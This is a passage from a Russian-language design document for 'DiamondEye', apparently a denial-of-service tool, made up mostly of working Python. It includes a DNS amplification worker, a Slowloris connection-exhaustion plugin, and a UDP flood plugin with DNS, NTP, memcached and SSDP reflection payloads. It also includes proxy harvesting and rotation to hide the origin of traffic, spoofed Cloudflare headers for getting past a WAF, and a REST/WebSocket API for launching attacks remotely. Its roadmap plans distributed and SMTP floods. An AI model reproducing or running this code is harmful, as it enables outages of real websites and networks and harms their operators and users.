                          f"📈 Усиление: {self.estimated_amplified:,} пакетов | "
                          f"💾 ~{estimated_mbps:.1f} MB{Style.RESET_ALL}", end="")
                
                # Небольшая задержка
                await asyncio.sleep(0.01)
                
            except (BlockingIOError, socket.error):
                await asyncio.sleep(0.001)
                continue
            except Exception as e:
                if self._running:
                    print(f"{Fore.RED}[DNS Worker {worker_id}] Ошибка: {e}{Style.RESET_ALL}")
                await asyncio.sleep(0.1)
    
    except Exception as e:
        print(f"{Fore.RED}❌ DNS Worker {worker_id} failed: {e}{Style.RESET_ALL}")
    finally:
        if sock:
            try:
                sock.close()
            except:
                pass
```

---
## 11. СИСТЕМА ПЛАГИНОВ

### 11.1. Архитектура плагинной системы

```python
class PluginManager:
    """Менеджер плагинов для динамической загрузки расширений"""
    
    def __init__(self, plugins_dir: str = "plugins"):
        self.plugins_dir = plugins_dir
        self.plugins: Dict[str, BasePlugin] = {}
        self._loaded = False
        
    async def discover_plugins(self):
        """Автоматическое обнаружение и загрузка плагинов"""
        import os
        import sys
        
        if not os.path.exists(self.plugins_dir):
            os.makedirs(self.plugins_dir, exist_ok=True)
            self._create_example_plugin()
        
        # Добавление директории плагинов в путь Python
        if self.plugins_dir not in sys.path:
            sys.path.insert(0, self.plugins_dir)
        
        # Поиск файлов плагинов
        for root, dirs, files in os.walk(self.plugins_dir):
            for file in files:
                if file.endswith('_plugin.py') and not file.startswith('_'):
                    await self._load_plugin(os.path.join(root, file))
        
        self._loaded = True
        print(f"{Fore.GREEN}✅ Загружено {len(self.plugins)} плагинов{Style.RESET_ALL}")
```

### 11.2. Базовый класс плагина

```python
class BasePlugin(ABC):
    """Базовый класс для всех плагинов DiamondEye"""
    
    @abstractmethod
    async def initialize(self, config: Dict[str, Any]) -> bool:
        """Инициализация плагина с конфигурацией"""
        pass
    
    @abstractmethod
    async def execute(self, target: str, **kwargs) -> Dict[str, Any]:
        """Выполнение основной логики плагина"""
        pass
    
    @abstractmethod
    async def cleanup(self):
        """Очистка ресурсов плагина"""
        pass
    
    def get_info(self) -> PluginInfo:
        """Получение информации о плагине"""
        return PluginInfo(
            name=self.__class__.__name__,
            version="1.0.0",
            author="DiamondEye Team",
            description="Базовый плагин",
            attack_types=['http']
        )
```

### 11.3. Slowloris Plugin

```python
class SlowlorisPlugin(BasePlugin):
    """Slowloris плагин - множество долгоживущих неполных соединений"""
    
    def __init__(self):
        self.connections: List[socket.socket] = []
        self.running = False
        self.stats = {
            'connections_created': 0,
            'connections_active': 0,
            'headers_sent': 0
        }
    
    async def initialize(self, config: Dict[str, Any]) -> bool:
        self.config = config
        self.host = config.get('host', '')
        self.port = config.get('port', 80)
        self.max_connections = config.get('max_connections', 500)
        self.timeout = config.get('timeout', 10)
        self.keepalive_interval = config.get('keepalive_interval', 15)
        return True
    
    async def execute(self, target: str, **kwargs) -> Dict[str, Any]:
        """Запуск Slowloris атаки"""
        host, port = self._parse_target(target)
        
        self.running = True
        print(f"{Fore.CYAN}🐌 Запуск Slowloris на {host}:{port}{Style.RESET_ALL}")
        
        # Создание соединений
        connection_tasks = []
        for i in range(self.max_connections):
            task = asyncio.create_task(
                self.create_slow_connection(host, port, i)
            )
            connection_tasks.append(task)
            await asyncio.sleep(0.01)  # Постепенное создание
        
        # Мониторинг
        monitor_task = asyncio.create_task(self.monitor_connections())
        
        # Ожидание
        try:
            await asyncio.gather(*connection_tasks, monitor_task)
        except asyncio.CancelledError:
            pass
        
        return {
            'attack_type': 'slowloris',
            'target': f"{host}:{port}",
            'stats': self.stats,
            'duration': kwargs.get('duration', 0)
        }
    
    async def create_slow_connection(self, host: str, port: int, conn_id: int):
        """Создание одного медленного соединения"""
        sock = None
        
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(self.timeout)
            
            # Подключение
            sock.connect((host, port))
            self.stats['connections_created'] += 1
            self.stats['connections_active'] += 1
            
            # Отправка неполного HTTP запроса
            request = f"GET /?{random.randint(1, 9999)} HTTP/1.1\r\n"
            request += f"Host: {host}\r\n"
            request += "User-Agent: Mozilla/5.0 (Slowloris)\r\n"
            request += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
            
            sock.send(request.encode())
            self.stats['headers_sent'] += 1
            
            # Поддержание соединения
            while self.running and sock:
                await asyncio.sleep(random.randint(self.keepalive_interval - 5, 
                                                  self.keepalive_interval + 5))
                
                if self.running and sock:
                    # Отправка дополнительного заголовка
                    header = f"X-{random_string(8)}: {random_string(16)}\r\n"
                    sock.send(header.encode())
                    self.stats['headers_sent'] += 1
        
        except:
            pass
        finally:
            if sock:
                sock.close()
            self.stats['connections_active'] -= 1
```

### 11.4. UDP Custom Plugin

```python
class UDPCustomFloodPlugin(BasePlugin):
    """UDP флуд с кастомными протоколами"""
    
    PROTOCOL_TEMPLATES = {
        'dns': lambda: struct.pack('!HHHHHH', random.randint(0, 65535), 0x0100, 1, 0, 0, 0),
        'ntp': lambda: struct.pack('!BBBB IIII IIII IIII', 0x1b, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0),
        'memcached': lambda: b'\x00\x00\x00\x00\x00\x01\x00\x00stats\r\n',
        'ssdp': lambda: b'M-SEARCH * HTTP/1.1\r\nHOST: 239.255.255.250:1900\r\nMAN: "ssdp:discover"\r\nMX: 1\r\nST: ssdp:all\r\n\r\n',
        'random': lambda: os.urandom(random.randint(64, 1500))
    }
    
    async def execute(self, target: str, **kwargs) -> Dict[str, Any]:
        """Запуск UDP флуда"""
        host, port = self._parse_target(target)
        
        self.running = True
        workers = kwargs.get('workers', 50)
        protocol = kwargs.get('protocol', 'random')
        
        print(f"{Fore.CYAN}🌀 UDP {protocol.upper()} флуд на {host}:{port}{Style.RESET_ALL}")
        
        # Подготовка пакетов
        packets = self._prepare_packets(protocol, kwargs.get('packet_size', 512))
        
        # Создание воркеров
        tasks = []
        for i in range(workers):
            task = asyncio.create_task(
                self.udp_worker(host, port, packets, i)
            )
            tasks.append(task)
        
        # Мониторинг
        monitor_task = asyncio.create_task(self.monitor_stats())
        
        # Ожидание
        try:
            await asyncio.gather(*tasks, monitor_task)
        except asyncio.CancelledError:
            pass
        
        return {
            'attack_type': f'udp_{protocol}',
            'target': f"{host}:{port}",
            'stats': self.stats,
            'protocol': protocol
        }
    
    async def udp_worker(self, host: str, port: int, packets: list, worker_id: int):
        """Воркер для отправки UDP пакетов"""
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.setblocking(False)
        
        try:
            while self.running:
                # Выбор случайного пакета
                packet = random.choice(packets)
                
                try:
                    sock.sendto(packet, (host, port))
                    
                    # Обновление статистики
                    self.stats['packets_sent'] += 1
                    self.stats['bytes_sent'] += len(packet)
                    
                    # Небольшая задержка
                    await asyncio.sleep(0.0001)
                    
                except BlockingIOError:
                    await asyncio.sleep(0.001)
                
        except Exception as e:
            if self.running:
                print(f"{Fore.RED}[UDP Worker {worker_id}] Ошибка: {e}{Style.RESET_ALL}")
        finally:
            sock.close()
```

---

## 12. PROXY MANAGER

### 12.1. Архитектура Proxy Manager

```python
class ProxyManager:
    """Продвинутый менеджер прокси с авто-сбором и проверкой"""
    
    PROXY_SOURCES = [
        "https://api.proxyscrape.com/v2/?request=getproxies&protocol=http",
        "https://api.proxyscrape.com/v2/?request=getproxies&protocol=socks4",
        "https://api.proxyscrape.com/v2/?request=getproxies&protocol=socks5",
        "https://www.proxy-list.download/api/v1/get?type=http",
        "https://www.proxy-list.download/api/v1/get?type=https",
        "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt",
        "https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/http.txt",
    ]
    
    def __init__(self, max_proxies: int = 1000):
        self.proxies: List[Proxy] = []
        self.max_proxies = max_proxies
        self.current_index = 0
        self.stats = {
            'total_fetched': 0,
            'working_count': 0,
            'check_time': 0
        }
```

### 12.2. Сбор прокси

```python
async def fetch_proxies(self, force: bool = False):
    """Получение прокси из публичных источников"""
    print(f"{Fore.CYAN}🌐 Сбор прокси из {len(self.PROXY_SOURCES)} источников...{Style.RESET_ALL}")
    
    # Попытка загрузки из кэша
    if not force and await self.load_from_cache():
        print(f"{Fore.GREEN}✅ Загружено {len(self.proxies)} прокси из кэша{Style.RESET_ALL}")
        return self.proxies
    
    all_proxies = []
    
    async with aiohttp.ClientSession(
        connector=aiohttp.TCPConnector(ssl=False),
        timeout=aiohttp.ClientTimeout(total=30)
    ) as session:
        tasks = []
        for url in self.PROXY_SOURCES:
            task = asyncio.create_task(self._fetch_from_source(session, url))
            tasks.append(task)
        
        results = await asyncio.gather(*tasks, return_exceptions=True)
        
        for result in results:
            if isinstance(result, list):
                all_proxies.extend(result)
    
    # Удаление дубликатов
    unique_proxies = {}
    for proxy in all_proxies:
        key = f"{proxy.host}:{proxy.port}:{proxy.protocol}"
        if key not in unique_proxies:
            unique_proxies[key] = proxy
    
    self.proxies = list(unique_proxies.values())[:self.max_proxies]
    self.stats['total_fetched'] = len(self.proxies)
    
    print(f"{Fore.GREEN}✅ Собрано {len(self.proxies)} уникальных прокси{Style.RESET_ALL}")
    
    # Сохранение в кэш
    await self.save_to_cache()
    
    return self.proxies
```

### 12.3. Проверка прокси

```python
async def check_proxy(self, proxy: Proxy, timeout: float = 5.0) -> bool:
    """Проверка работоспособности прокси"""
    start_time = time.time()
    
    if not proxy.host or proxy.port <= 0 or proxy.port > 65535:
        proxy.is_working = False
        return False
    
    test_url = random.choice([
        "http://httpbin.org/ip",
        "http://api.ipify.org?format=json",
        "https://api.ipify.org?format=json"
    ])
    
    try:
        connector = None
        if proxy.protocol.startswith('socks'):
            try:
                from aiohttp_socks import ProxyConnector
                connector = ProxyConnector.from_url(
                    f"{proxy.protocol}://{proxy.host}:{proxy.port}",
                    rdns=True
                )
            except ImportError:
                proxy.is_working = False
                return False
        else:
            connector = aiohttp.TCPConnector(ssl=False)
        
        async with aiohttp.ClientSession(
            connector=connector,
            timeout=aiohttp.ClientTimeout(total=timeout)
        ) as session:
            async with session.get(
                test_url,
                headers={'User-Agent': 'Mozilla/5.0 (ProxyTester)'},
                ssl=False
            ) as response:
                if response.status == 200:
                    # Проверка анонимности
                    try:
                        data = await response.json()
                        if 'origin' in data:
                            if data['origin'] == proxy.host:
                                proxy.anonymity = "transparent"
                            else:
                                proxy.anonymity = "anonymous"
                    except:
                        proxy.anonymity = "unknown"
                    
                    proxy.latency = (time.time() - start_time) * 1000
                    proxy.last_check = datetime.now()
                    proxy.is_working = True
                    proxy.success_rate = min(1.0, proxy.success_rate + 0.1)
                    
                    # Оценка скорости
                    if proxy.latency < 100:
                        proxy.speed_score = 1.0
                    elif proxy.latency < 500:
                        proxy.speed_score = 0.7
                    elif proxy.latency < 1000:
                        proxy.speed_score = 0.4
                    else:
                        proxy.speed_score = 0.1
                    
                    return True
    
    except:
        pass
    
    proxy.is_working = False
    proxy.success_rate = max(0.0, proxy.success_rate - 0.2)
    return False
```

### 12.4. Массовая проверка

```python
async def check_all(self, concurrency: int = 50, timeout: float = 5.0):
    """Массовая проверка всех прокси"""
    if not self.proxies:
        print(f"{Fore.YELLOW}⚠️  Нет прокси для проверки{Style.RESET_ALL}")
        return
    
    print(f"{Fore.CYAN}🔍 Проверка {len(self.proxies)} прокси (параллельно: {concurrency})...{Style.RESET_ALL}")
    
    semaphore = asyncio.Semaphore(concurrency)
    start_time = time.time()
    
    async def check_with_semaphore(proxy: Proxy):
        async with semaphore:
            await self.check_proxy(proxy, timeout)
    
    # Создание задач для проверки
    tasks = [check_with_semaphore(p) for p in self.proxies]
    
    # Разбиение на батчи для прогресс-бара
    batch_size = 100
    for i in range(0, len(tasks), batch_size):
        batch = tasks[i:i + batch_size]
        await asyncio.gather(*batch, return_exceptions=True)
        
        # Прогресс
        checked = min(i + batch_size, len(tasks))
        working = len([p for p in self.proxies[:checked] if p.is_working])
        print(f"\r{Fore.CYAN}📊 Прогресс: {checked}/{len(tasks)} | Рабочих: {working}{Style.RESET_ALL}", end="")
    
    print()  # Новая строка после прогресс-бара
    
    # Фильтрация неработающих прокси
    self.proxies = [p for p in self.proxies if p.is_working]
    self.stats['working_count'] = len(self.proxies)
    self.stats['check_time'] = time.time() - start_time
    
    print(f"{Fore.GREEN}✅ Проверка завершена: {len(self.proxies)} рабочих прокси{Style.RESET_ALL}")
    
    # Сохранение рабочих прокси
    await self.save_working_proxies()
```

### 12.5. Ротация прокси

```python
def get_next_proxy(self, strategy: str = 'weighted') -> Optional[str]:
    """Получение следующего прокси с различными стратегиями"""
    if not self.proxies:
        return None
    
    working_proxies = [p for p in self.proxies if p.is_working]
    if not working_proxies:
        return None
    
    if strategy == 'weighted':
        # Взвешенный случайный выбор
        weights = [p.speed_score * p.success_rate for p in working_proxies]
        if sum(weights) > 0:
            proxy = random.choices(working_proxies, weights=weights, k=1)[0]
        else:
            proxy = random.choice(working_proxies)
    
    elif strategy == 'fastest':
        # Самый быстрый прокси
        proxy = min(working_proxies, key=lambda x: x.latency)
    
    elif strategy == 'round_robin':
        # Циклическая ротация
        self.current_index = (self.current_index + 1) % len(working_proxies)
        proxy = working_proxies[self.current_index]
    
    else:  # random
        proxy = random.choice(working_proxies)
    
    return str(proxy)
```

---

## 13. УТИЛИТЫ

### 13.1. Сбор User-Agent (`getuas.py`)

```python
#!/usr/bin/env python3
"""
Скачивает список User-Agent с http://www.useragentstring.com/
Использование: python getuas.py "http://www.useragentstring.com/pages/Chrome/"
"""

def fetch_user_agents(url: str) -> list:
    """Fetch and parse User-Agent strings from useragentstring.com"""
    if "useragentstring.com" not in url:
        print("❌ URL must be from http://www.useragentstring.com/")
        return []

    try:
        req = urllib.request.Request(
            url,
            headers={"User-Agent": "Mozilla/5.0 (X11; Linux x86_64) DiamondEye/9.0"}
        )
        with urllib.request.urlopen(req, timeout=10) as f:
            if f.getcode() != 200:
                print(f"❌ HTTP {f.getcode()}")
                return []
            html_doc = f.read().decode('utf-8')

        soup = BeautifulSoup(html_doc, 'html.parser')
        liste = soup.find(id='liste')
        if not liste:
            print("❌ #liste not found. Structure changed?")
            return []

        uas = liste.find_all('li')
        if not uas:
            print("❌ No <li> elements found.")
            return []

        user_agents = []
        for ua in uas:
            ua_text = ua.get_text().strip()
            if ua_text:
                user_agents.append(ua_text)

        return user_agents
```

### 13.2. Сбор Wordlist (`getwordlists.py`)

```python
#!/usr/bin/env python3
"""
DiamondEye — Wordlist Fetcher
Собирает актуальные списки путей с открытых источников
"""

SOURCES = {
    # Общие
    "https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/Web-Content/common.txt": "common",
    "https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/Web-Content/quickhits.txt": "quickhits",
    
    # Админ
    "https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/Web-Content/Admin%20Panels/common-admin-panels.txt": "admin",
    
    # CMS
    "https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/Web-Content/CMS/WordPress.fuzz.txt": "wordpress",
    
    # API
    "https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/Web-Content/api/common-api-paths.txt": "api",
}

async def download_and_parse(session, url, category):
    """Загрузка и парсинг wordlist"""
    content = await fetch_text(session, url)
    if not content:
        return []

    paths = extract_paths(content, url)
    print(f"✅ Загружено из {category}: {len(paths)} путей — {url}")
    return paths
```

### 13.3. Техники обхода (`techniques.py`)

```python
class BypassTechniques:
    """Техники обхода WAF и систем защиты"""
    
    @staticmethod
    def cloudflare_headers() -> Dict[str, str]:
        """Заголовки для обхода Cloudflare"""
        cf_connecting_ip = f"{random.randint(1,255)}.{random.randint(1,255)}." \
                          f"{random.randint(1,255)}.{random.randint(1,255)}"
        
        return {
            'CF-Connecting-IP': cf_connecting_ip,
            'X-Forwarded-For': cf_connecting_ip,
            'True-Client-IP': cf_connecting_ip,
            'CF-RAY': hashlib.md5(str(random.random()).encode()).hexdigest()[:16],
            'CF-IPCountry': random.choice(['US', 'GB', 'DE', 'FR', 'JP']),
        }
    
    @staticmethod
    def rotate_user_agents() -> List[str]:
        """Список легитимных User-Agent"""
        return [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/120.0',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 14_2_1) AppleWebKit/605.1.15 Safari/605.1.15',
        ]
```

---

## 14. СЕТЕВЫЕ ПРОТОКОЛЫ

### 14.1. HTTP/1.1 Реализация

```python
class HTTP11Handler:
    """Обработчик HTTP/1.1 с keep-alive и пуллингом"""
    
    def __init__(self, config):
        self.config = config
        self.connection_pool = ConnectionPool(max_size=100)
        self.keepalive_timeout = 5.0
    
    async def send_request(self, request):
        """Отправка HTTP/1.1 запроса с переиспользованием соединений"""
        # Получение соединения из пула
        connection = await self._get_connection(request.url)
        
        try:
            # Формирование сырого запроса
            raw_request = self._build_raw_request(request)
            
            # Отправка
            await connection.write(raw_request)
            
            # Чтение ответа
            response = await self._read_response(connection)
            
            # Возврат соединения в пул
            if response.should_keep_alive:
                self.connection_pool.release(connection)
            else:
                await connection.close()
            
            return response
            
        except Exception as e:
            # Обработка ошибок соединения
            await self._handle_connection_error(connection, e)
            raise
```

### 14.2. HTTP/2 Реализация

```python
class HTTP2Handler:
    """Обработчик HTTP/2 с мультиплексированием и rapid reset"""
    
    async def send_requests(self, requests):
        """Отправка множества запросов через одно соединение HTTP/2"""
        async with httpx.AsyncClient(http2=True) as client:
            tasks = []
            for request in requests:
                task = asyncio.create_task(
                    self._send_single_request(client, request)
                )
                tasks.append(task)
            
            responses = await asyncio.gather(*tasks, return_exceptions=True)
            return responses
    
    async def rapid_reset(self, client, target_url):
        """HTTP/2 Rapid Reset атака"""
        streams = []
        
        for i in range(1000):
            # Создание stream с флагом END_STREAM
            stream_id = i * 2 + 1
            # Отправка HEADERS с флагом END_STREAM
            # Немедленный RST_STREAM
            # Повторное использование stream id
            pass
```

### 14.3. QUIC/HTTP3 Поддержка

```python
class HTTP3Handler:
    """Экспериментальная поддержка HTTP/3 через aioquic"""
    
    def __init__(self):
        try:
            import aioquic
            from aioquic.quic import configuration
            self.quic_available = True
        except ImportError:
            self.quic_available = False
            print(f"{Fore.YELLOW}⚠️  aioquic не установлен. HTTP/3 недоступен.{Style.RESET_ALL}")
    
    async def connect(self, url):
        """Установка QUIC соединения"""
        if not self.quic_available:
            raise RuntimeError("aioquic не установлен")
        
        parsed = urlparse(url)
        
        # Создание QUIC конфигурации
        configuration = QuicConfiguration(
            is_client=True,
            verify_mode=ssl.CERT_NONE,
            alpn_protocols=["h3"]
        )
        
        async with connect(
            parsed.hostname,
            parsed.port or 443,
            configuration=configuration
        ) as protocol:
            return protocol
```

---

## 15. БЕЗОПАСНОСТЬ И ОБРАБОТКА ОШИБОК

### 15.1. Валидация целей

```python
class SecurityManager:
    """Менеджер безопасности и валидации целей"""
    
    FORBIDDEN_DOMAINS = [
        '.gov.', '.mil.', '.bank.',
        'google.com', 'facebook.com',
        'cloudflare.com', 'amazon.com',
        'microsoft.com', 'apple.com'
    ]
    
    @staticmethod
    def validate_target(target):
        """Валидация цели для предотвращения непреднамеренного использования"""
        parsed = urlparse(target)
        domain = parsed.netloc.lower()
        
        # Проверка запрещенных доменов
        for forbidden in SecurityManager.FORBIDDEN_DOMAINS:
            if forbidden in domain:
                raise SecurityError(f"Доступ к {domain} запрещен")
        
        # Проверка localhost
        if domain in ['localhost', '127.0.0.1', '0.0.0.0']:
            print(f"{Fore.YELLOW}⚠️  Предупреждение: тестирование localhost{Style.RESET_ALL}")
            return True
        
        # Проверка частных сетей
        private_networks = [
            '192.168.', '10.', '172.16.', '172.31.',
            '169.254.'  # APIPA
        ]
        
        for network in private_networks:
            if domain.startswith(network):
                print(f"{Fore.YELLOW}⚠️  Предупреждение: тестирование частной сети{Style.RESET_ALL}")
                return True
        
        return True
```

### 15.2. Централизованная обработка ошибок

```python
class ErrorHandler:
    """Централизованная обработка ошибок с категоризацией"""
    
    ERROR_CATEGORIES = {
        'network': [TimeoutError, ConnectionError, httpx.NetworkError, socket.error],
        'protocol': [httpx.ProtocolError, httpx.DecodingError, websockets.exceptions.WebSocketException],
        'ssl': [ssl.SSLError, httpx.SSLContextError],
        'resource': [MemoryError, OSError, asyncio.QueueFull],
        'validation': [ValueError, TypeError, argparse.ArgumentError],
        'security': [SecurityError, PermissionError]
    }
    
    @classmethod
    def handle(cls, error, context=None, raise_error=False):
        """Обработка ошибки с учетом контекста"""
        # Классификация ошибки
        category = cls._categorize_error(error)
        
        # Логирование
        cls._log_error(error, category, context)
        
        # Восстановление или эскалация
        if cls._is_recoverable(error, category):
            return cls._recover(error, context)
        elif raise_error:
            raise cls._wrap_error(error, category)
        else:
            print(f"{Fore.RED}❌ {category.upper()} ошибка: {error}{Style.RESET_ALL}")
            if context and context.get('debug'):
                import traceback
                traceback.print_exc()
    
    @classmethod
    def _categorize_error(cls, error):
        """Категоризация ошибки"""
        for category, error_types in cls.ERROR_CATEGORIES.items():
            if any(isinstance(error, et) for et in error_types):
                return category
        return 'unknown'
```

### 15.3. Rate Limiting и Backoff

```python
class RateLimiter:
    """Ограничитель скорости запросов с экспоненциальным откатом"""
    
    def __init__(self, max_rate=1000, backoff_factor=1.5, max_backoff=60):
        self.max_rate = max_rate  # запросов в секунду
        self.backoff_factor = backoff_factor
        self.max_backoff = max_backoff
        self.request_times = deque(maxlen=max_rate)
        self.current_backoff = 0
        
    async def acquire(self):
        """Получение разрешения на отправку запроса"""
        now = time.time()
        
        # Удаление старых записей
        while self.request_times and self.request_times[0] < now - 1:
            self.request_times.popleft()
        
        # Проверка лимита
        if len(self.request_times) >= self.max_rate:
            # Применение экспоненциального отката
            self.current_backoff = min(
                self.current_backoff * self.backoff_factor,
                self.max_backoff
            )
            sleep_time = self.current_backoff
        else:
            self.current_backoff = max(0, self.current_backoff / self.backoff_factor)
            sleep_time = 0
        
        # Ожидание если нужно
        if sleep_time > 0:
            await asyncio.sleep(sleep_time)
            now = time.time()
        
        self.request_times.append(now)
        return True
```

---

## 16. ПРОИЗВОДИТЕЛЬНОСТЬ И ОПТИМИЗАЦИЯ

### 16.1. Профилирование и мониторинг

```python
class PerformanceMonitor:
    """Мониторинг производительности в реальном времени"""
    
    def __init__(self):
        self.metrics = defaultdict(list)
        self.start_time = time.time()
        self.optimization_suggestions = []
    
    def record_metric(self, name, value):
        """Запись метрики с временной меткой"""
        self.metrics[name].append({
            'timestamp': time.time(),
            'value': value
        })
        
        # Автоматический анализ для оптимизации
        if len(self.metrics[name]) >= 10:
            self._analyze_for_optimization(name)
    
    def _analyze_for_optimization(self, metric_name):
        """Анализ метрик для предложения оптимизаций"""
        values = [m['value'] for m in self.metrics[metric_name][-10:]]
        
        if metric_name == 'rps':
            avg_rps = statistics.mean(values)
            if avg_rps < 1000:
                self.optimization_suggestions.append("Увеличьте количество workers")
            elif avg_rps > 50000:
                self.optimization_suggestions.append("Используйте HTTP/2 для уменьшения соединений")
        
        elif metric_name == 'latency':
            avg_latency = statistics.mean(values)
            if avg_latency > 1000:
                self.optimization_suggestions.append("Уменьшите количество запросов или используйте прокси")
        
        elif metric_name == 'error_rate':
            avg_error = statistics.mean(values)
            if avg_error > 0.1:
                self.optimization_suggestions.append("Уменьшите скорость запросов")
```

### 16.2. Оптимизация памяти

```python
class MemoryOptimizer:
    """Оптимизатор использования памяти"""
    
    @staticmethod
    def optimize_attack(attack):
        """Оптимизация атаки для снижения потребления памяти"""
        
        # 1. Генераторы вместо списков
        def request_generator():
            while True:
                yield build_random_request()
        
        # 2. Ограниченные кэши
        import functools
        
        @functools.lru_cache(maxsize=1000)
        def cached_generation(key):
            return generate_complex_value(key)
        
        # 3. Слабые ссылки для кэширования
        import weakref
        cache = weakref.WeakValueDictionary()
        
        # 4. Пакетная обработка
        BATCH_SIZE = 1000
        for i in range(0, total_requests, BATCH_SIZE):
            batch = requests[i:i+BATCH_SIZE]
            process_batch(batch)
            del batch  # Явное удаление ссылки
        
        # 5. Использование массивов вместо списков для числовых данных
        import array
        latencies = array.array('f')  # float array
        
        return attack
```

### 16.3. Оптимизация сети

```python
class NetworkOptimizer:
    """Оптимизатор сетевых параметров"""
    
    @staticmethod
    def optimize_for_os(os_name):
        """Оптимизация сетевых параметров для ОС"""
        optimizations = {
            'linux': {
                'tcp_tw_reuse': 1,
                'tcp_fin_timeout': 15,
                'tcp_max_syn_backlog': 65536,
                'somaxconn': 65535,
                'net.core.rmem_max': 134217728,
                'net.core.wmem_max': 134217728
            },
            'windows': {
                'MaxUserPort': 65534,
                'TcpTimedWaitDelay': 30,
                'TcpNumConnections': 16777214
            },
            'darwin': {  # macOS
                'kern.maxfiles': 131072,
                'kern.maxfilesperproc': 65536,
                'net.inet.ip.portrange.first': 1024
            }
        }
        
        return optimizations.get(os_name, {})
    
    @staticmethod
    async def measure_bandwidth(target_url, duration=5):
        """Измерение доступной пропускной способности"""
        import speedtest
        
        print(f"{Fore.CYAN}📡 Измерение пропускной способности...{Style.RESET_ALL}")
        
        st = speedtest.Speedtest()
        st.get_best_server()
        
        download_speed = st.download() / 1_000_000  # Mbps
        upload_speed = st.upload() / 1_000_000  # Mbps
        
        print(f"{Fore.GREEN}✅ Download: {download_speed:.1f} Mbps | Upload: {upload_speed:.1f} Mbps{Style.RESET_ALL}")
        
        # Рекомендации на основе скорости
        if download_speed < 10:
            return {"max_workers": 50, "max_sockets": 100}
        elif download_speed < 100:
            return {"max_workers": 200, "max_sockets": 500}
        else:
            return {"max_workers": 500, "max_sockets": 2000}
```

---

## 17. API ДЛЯ РАСШИРЕНИЯ

### 17.1. REST API Server

```python
# api/server.py
from fastapi import FastAPI, BackgroundTasks
from pydantic import BaseModel

app = FastAPI(title="DiamondEye API v10.0")

class AttackRequest(BaseModel):
    target: str
    attack_type: str = "http"
    workers: int = 100
    duration: int = 60
    config: Dict[str, Any] = {}

@app.post("/attack/start")
async def start_attack(request: AttackRequest, background_tasks: BackgroundTasks):
    """Запуск атаки через API"""
    attack_id = generate_attack_id()
    
    # Запуск в фоне
    background_tasks.add_task(
        run_attack_async,
        attack_id=attack_id,
        config=request.dict()
    )
    
    return {
        "attack_id": attack_id, 
        "status": "started",
        "message": f"Attack {attack_id} started against {request.target}"
    }

@app.get("/attack/{attack_id}/status")
async def get_attack_status(attack_id: str):
    """Получение статуса атаки"""
    status = get_attack_status_from_db(attack_id)
    return status

@app.post("/attack/{attack_id}/stop")
async def stop_attack(attack_id: str):
    """Остановка атаки"""
    stop_attack_by_id(attack_id)
    return {"status": "stopped", "attack_id": attack_id}

@app.get("/plugins")
async def list_plugins():
    """Получение списка плагинов"""
    plugin_manager = PluginManager()
    await plugin_manager.discover_plugins()
    
    plugins = []
    for plugin_info in plugin_manager.list_plugins():
        plugins.append({
            "name": plugin_info.name,
            "version": plugin_info.version,
            "description": plugin_info.description,
            "attack_types": plugin_info.attack_types
        })
    
    return {"plugins": plugins}
```

### 17.2. WebSocket API для реального времени

```python
# api/websocket.py
import websockets
import json

async def attack_websocket(websocket, path):
    """WebSocket endpoint для реального времени"""
    await websocket.send(json.dumps({"type": "connected", "message": "Connected to DiamondEye API"}))
    
    try:
        async for message in websocket:
            data = json.loads(message)
            
            if data.get("type") == "start_attack":
                # Запуск атаки
                attack_id = start_attack(data["config"])
                
                # Отправка обновлений в реальном времени
                async for update in get_attack_updates(attack_id):
                    await websocket.send(json.dumps(update))
                    
            elif data.get("type") == "stop_attack":
                stop_attack(data["attack_id"])
                await websocket.send(json.dumps({"type": "stopped", "attack_id": data["attack_id"]}))
                
    except websockets.ConnectionClosed:
        print("WebSocket connection closed")
```

### 17.3. Python API для интеграции

```python
# api/python_client.py
class DiamondEyeClient:
    """Python клиент для DiamondEye API"""
    
    def __init__(self, base_url="http://localhost:8000"):
        self.base_url = base_url
        self.session = aiohttp.ClientSession()
    
    async def start_attack(self, target, attack_type="http", **kwargs):
        """Запуск атаки через API"""
        data = {
            "target": target,
            "attack_type": attack_type,
            **kwargs
        }
        
        async with self.session.post(f"{self.base_url}/attack/start", json=data) as resp:
            return await resp.json()
    
    async def get_status(self, attack_id):
        """Получение статуса атаки"""
        async with self.session.get(f"{self.base_url}/attack/{attack_id}/status") as resp:
            return await resp.json()
    
    async def stop_attack(self, attack_id):
        """Остановка атаки"""
        async with self.session.post(f"{self.base_url}/attack/{attack_id}/stop") as resp:
            return await resp.json()
```

---

## 18. ROADMAP И РАЗВИТИЕ

### 18.1. Краткосрочные цели (v10.1)

1. **Улучшение HTTP/3 поддержки**
   - Нативная интеграция с aioquic
   - Оптимизация QUIC handshake
   - Поддержка 0-RTT

2. **Расширенное сканирование**
   - Автоматическое обнаружение API
   - Фаззинг параметров GraphQL
   - Обнаружение микросервисов

3. **Улучшенная аналитика**
   - Машинное обучение для оптимизации RPS
   - Предсказание отказов
   - Автоматическая калибровка

### 18.2. Среднесрочные цели (v10.5)

1. **Распределенная архитектура**
   - Master-Worker модель
   - Координация через Redis
   - Геораспределение атак

2. **Поддержка протоколов**
   - DNS amplification v2
   - LDAP injection
   - SMTP flood
   - VoIP атаки

3. **Графический интерфейс**
   - Web-based dashboard
   - Real-time визуализация
   - Управление через браузер

### 18.3. Долгосрочное видение (v11.0)

1. **Платформа тестирования безопасности**
   - Интеграция с OWASP ZAP
   - Автоматические отчеты PDF
   - CI/CD интеграция

2. **Образовательный модуль**
   - Интерактивные уроки
   - CTF задачи
   - Сертификация

3. **Enterprise функции**
   - Role-based access control
   - Audit logging
   - Compliance reporting

---

